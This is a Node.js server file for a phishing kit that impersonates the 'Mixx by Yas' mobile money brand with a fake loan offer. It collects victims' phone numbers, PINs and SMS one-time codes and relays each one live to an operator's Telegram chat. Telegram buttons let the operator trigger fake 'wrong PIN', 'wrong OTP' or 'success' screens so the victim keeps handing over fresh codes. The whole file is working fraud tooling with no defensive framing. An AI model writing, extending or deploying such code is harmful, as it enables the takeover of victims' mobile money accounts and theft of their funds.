/**
 * Mixx by Yas - Backend Server
 * Multi-Admin Independent Session Routing & Telegram Bot Integration
 */

const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Environment Variables Configuration
const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const DEFAULT_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!TOKEN) {
    console.warn("⚠️ Warning: TELEGRAM_BOT_TOKEN is not set in environment variables.");
}

const bot = new TelegramBot(TOKEN, { polling: true });
const sessions = new Map();

/**
 * Helper to determine target Admin Chat ID based on request or fallback
 */
function getTargetChatId(reqChatId) {
    return reqChatId || DEFAULT_CHAT_ID;
}

/**
 * 1. Receive PIN Submission & Send Telegram Notification strictly to the Admin tied to that link
 */
app.post('/api/submit-application', (req, res) => {
    try {
        const { phone, pin, amount, adminChatId } = req.body;
        const targetChat = getTargetChatId(adminChatId);
        const userId = phone || `user_${Date.now()}`;

        sessions.set(userId, {
            phone,
            pin,
            amount: amount || 'TZS 1,000,000',
            adminChatId: targetChat,
            status: 'WAITING_PIN_APPROVAL',
            createdAt: new Date()
        });

        const message = `🚨 *NEW LOAN LOGIN / PIN ATTEMPT*\n\n` +
                        `📱 *Phone:* +255 ${phone}\n` +
                        `🔑 *PIN Entered:* \`${pin}\`\n` +
                        `💰 *Selected Amount:* ${amount}\n\n` +
                        `📌 *Status:* Waiting for Admin Approval`;

        const opts = {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '✅ ALLOW OTP', callback_data: `ALLOW_OTP_${userId}` },
                        { text: '❌ DENY OTP', callback_data: `DENY_OTP_${userId}` }
                    ]
                ]
            }
        };

        if (!targetChat) {
            return res.status(400).json({ success: false, error: 'No admin chat ID configured or provided via link' });
        }

        bot.sendMessage(targetChat, message, opts)
           .then(sentMsg => {
               const session = sessions.get(userId);
               if (session) session.adminMsgId = sentMsg.message_id;
               res.status(200).json({ success: true, userId });
           })
           .catch(err => {
               console.error('Telegram API Error:', err.message);
               res.status(500).json({ success: false, error: 'Telegram notification failed' });
           });

    } catch (error) {
        console.error('Server Error:', error);
        res.status(500).json({ success: false, error: 'Internal server error' });
    }
});

/**
 * 2. Check session status endpoint for UI polling
 */
app.get('/api/check-status/:userId', (req, res) => {
    const { userId } = req.params;
    const session = sessions.get(userId);
    if (!session) return res.status(404).json({ status: 'NOT_FOUND' });
    res.status(200).json({ status: session.status });
});

/**
 * 3. Receive SMS OTP & Prompt the Specific Admin who owns the session
 */
app.post('/api/submit-otp', (req, res) => {
    try {
        const { userId, otp } = req.body;
        const session = sessions.get(userId);

        if (!session) return res.status(404).json({ success: false, error: 'Session not found' });

        session.status = 'WAITING_OTP_VERIFICATION';
        session.otp = otp;

        const message = `📩 *SMS OTP SUBMITTED BY USER*\n\n` +
                        `📱 *User:* +255 ${session.phone}\n` +
                        `🔢 *OTP Entered:* \`${otp}\`\n\n` +
                        `Choose verification response:`;

        const opts = {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '⚠️ WRONG PIN', callback_data: `WRONG_PIN_${userId}` },
                        { text: '⚠️ WRONG OTP', callback_data: `WRONG_OTP_${userId}` }
                    ],
                    [
                        { text: '✅ CORRECT OTP', callback_data: `CORRECT_OTP_${userId}` }
                    ]
                ]
            }
        };

        const targetChat = session.adminChatId || DEFAULT_CHAT_ID;

        bot.sendMessage(targetChat, message, opts)
           .catch(err => console.error('Telegram Error:', err.message));

        res.status(200).json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, error: 'Internal server error' });
    }
});

/**
 * 4. Handle Applicant clicking "REQUEST NEW OTP"
 */
app.post('/api/request-new-otp', (req, res) => {
    try {
        const { userId } = req.body;
        const session = sessions.get(userId);

        if (!session) return res.status(404).json({ success: false, error: 'Session not found' });

        session.status = 'REQUESTED_NEW_OTP';

        const message = `🔄 *OTP EXPIRATION / REQUEST NEW OTP*\n\n` +
                        `📱 *User:* +255 ${session.phone}\n` +
                        `⚠️ *Notice:* Applicant reports that their OTP has expired and is requesting a new code.\n\n` +
                        `Choose admin action:`;

        const opts = {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '✅ ALLOW OTP', callback_data: `ALLOW_OTP_${userId}` },
                        { text: '❌ DENY OTP', callback_data: `DENY_OTP_${userId}` }
                    ]
                ]
            }
        };

        const targetChat = session.adminChatId || DEFAULT_CHAT_ID;

        bot.sendMessage(targetChat, message, opts)
           .catch(err => console.error('Telegram Error (New OTP):', err.message));

        res.status(200).json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, error: 'Internal server error' });
    }
});

/**
 * 5. Independent Telegram Admin Callback Query Handler (Security Enforced)
 */
bot.on('callback_query', async (query) => {
    try {
        const actionData = query.data;
        const parts = actionData.split('_');
        
        let fullCmd, userId;
        if (actionData.startsWith('ALLOW_OTP_') || actionData.startsWith('DENY_OTP_') || actionData.startsWith('CORRECT_OTP_')) {
            fullCmd = `${parts[0]}_${parts[1]}`;
            userId = parts.slice(2).join('_');
        } else {
            fullCmd = `${parts[0]}_${parts[1]}`;
            userId = parts.slice(2).join('_');
        }

        const session = sessions.get(userId);
        if (!session) {
            return bot.answerCallbackQuery(query.id, { text: '⚠️ Session expired.' });
        }

        // STRICT INDEPENDENT ACCESS CONTROL: 
        // Ensure only the specific admin assigned to this session can control actions for this link
        const senderChatId = query.message.chat.id.toString();
        const authorizedChatId = (session.adminChatId || DEFAULT_CHAT_ID).toString();

        if (senderChatId !== authorizedChatId) {
            return bot.answerCallbackQuery(query.id, { 
                text: '⛔ Unauthorized: You do not control this session link.', 
                show_alert: true 
            });
        }

        const chatTarget = authorizedChatId;

        switch (fullCmd) {
            case 'ALLOW_OTP':
                session.status = 'APPROVED_LOAD_OTP';
                await bot.sendMessage(chatTarget, `✅ OTP Screen loaded for +255 ${session.phone}`);
                break;
            case 'DENY_OTP':
                session.status = 'DENIED';
                await bot.sendMessage(chatTarget, `❌ Access Denied for +255 ${session.phone}`);
                break;
            case 'CORRECT_OTP':
                session.status = 'SUCCESS';
                await bot.sendMessage(chatTarget, `🎉 Success screen triggered for +255 ${session.phone}`);
                break;
            case 'WRONG_PIN':
                session.status = 'WRONG_PIN_ERROR';
                await bot.sendMessage(chatTarget, `⚠️ Triggered Wrong PIN error for +255 ${session.phone}`);
                break;
            case 'WRONG_OTP':
                session.status = 'WRONG_OTP_ERROR';
                await bot.sendMessage(chatTarget, `⚠️ Triggered Wrong OTP error for +255 ${session.phone}`);
                break;
        }

        await bot.answerCallbackQuery(query.id, { text: `Processed: ${fullCmd}` });
    } catch (error) {
        console.error('Callback Error:', error);
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`[Server] Mixx by Yas server running smoothly on port ${PORT}`);
});
